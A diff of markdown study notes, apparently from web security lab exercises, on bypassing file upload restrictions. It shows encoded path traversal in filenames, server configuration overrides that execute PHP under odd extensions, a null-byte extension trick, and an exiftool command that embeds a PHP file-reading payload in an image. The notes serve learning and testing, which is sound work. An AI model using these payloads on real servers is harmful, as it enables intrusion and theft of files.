@@ -17,14 +17,14 @@
 ## Preventing file execution in user-accessible directories
 
 - change the `filename` to include a [[WEB/vulnerabilities/Path Traversal/concepts|directory traversal]] sequence:
-    `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
-- response: `The file avatars/exploit.php has been uploaded.` -> failed
-- Obfuscate the sequence -> `filename="..%2fexploit.php"`
-- response: `The file avatars/../exploit.php has been uploaded.` -> success
+    - `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
+    	- response: `The file avatars/exploit.php has been uploaded.` -> failed
+    - Obfuscate the sequence -> `filename="..%2fexploit.php"`
+    	- response: `The file avatars/../exploit.php has been uploaded.` -> success
 - `GET /files/avatars/..%2fexploit.php` or `GET /files/exploit.php`
-# Insufficient blacklisting
+## Insufficient blacklisting
 
-## Overriding the server configuration
+### Overriding the server configuration
 
 apache: 
 `LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php`
@@ -39,5 +39,17 @@ IIS:
 - again in  in `POST /my-account/avatar
 	- `filename` -> from `exploit.php` to `exploit.l33`
 - `GET /files/avatars/exploit.l33t`
-## Obfuscating file extensions
+### Obfuscating file extensions
 
+-  in `POST /my-account/avatar` 
+	-  `filename="exploit.php%00.jpg"`
+		- `exploit.php` in http response -> null byte stripped
+- `GET /files/avatars/exploit.php`
+## Flawed validation of the file's contents
+
+```shell
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+```
+- adds the PHP payload to the image's `Comment`
+- saves the image with a `.php` extension
+- `GET /files/avatars/polyglot.php` => `START [secret text] END`
